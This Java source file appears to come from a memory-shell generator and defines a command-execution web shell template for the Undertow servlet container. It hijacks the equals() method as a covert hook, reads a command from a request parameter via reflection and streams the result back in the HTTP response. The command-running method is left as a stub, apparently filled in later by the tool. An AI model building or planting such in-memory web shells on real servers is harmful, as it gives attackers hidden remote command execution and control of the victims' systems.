package com.reajason.javaweb.memshell.shelltool.command;

import sun.misc.Unsafe;

import java.io.InputStream;
import java.io.OutputStream;
import java.lang.reflect.Field;
import java.lang.reflect.Method;

/**
 * @author ReaJason
 * @since 2025/5/15
 */
public class CommandUndertowServletHandler {
    private static String paramName;

    private String getParam(String param) {
        return param;
    }

    private InputStream getInputStream(String cmd) throws Exception {
        return null;
    }

    @Override
    public boolean equals(Object obj) {
        Object[] args = ((Object[]) obj);
        try {
            Object servletRequestContext = null;
            if (args.length == 2) {
                servletRequestContext = args[1];
            } else {
                servletRequestContext = args[2];
            }
            Object request = servletRequestContext.getClass().getMethod("getServletRequest").invoke(servletRequestContext);
            Object response = servletRequestContext.getClass().getMethod("getServletResponse").invoke(servletRequestContext);
            String cmd = getParam((String) request.getClass().getMethod("getParameter", String.class).invoke(request, paramName));
            if (cmd != null) {
                InputStream inputStream = getInputStream(cmd);
                OutputStream outputStream = (OutputStream) response.getClass().getMethod("getOutputStream").invoke(response);
                byte[] buf = new byte[8192];
                int length;
                while ((length = inputStream.read(buf)) != -1) {
                    outputStream.write(buf, 0, length);
                }
                return true;
            }
        } catch (Exception e) {
            e.printStackTrace();
        }
        return false;
    }
}
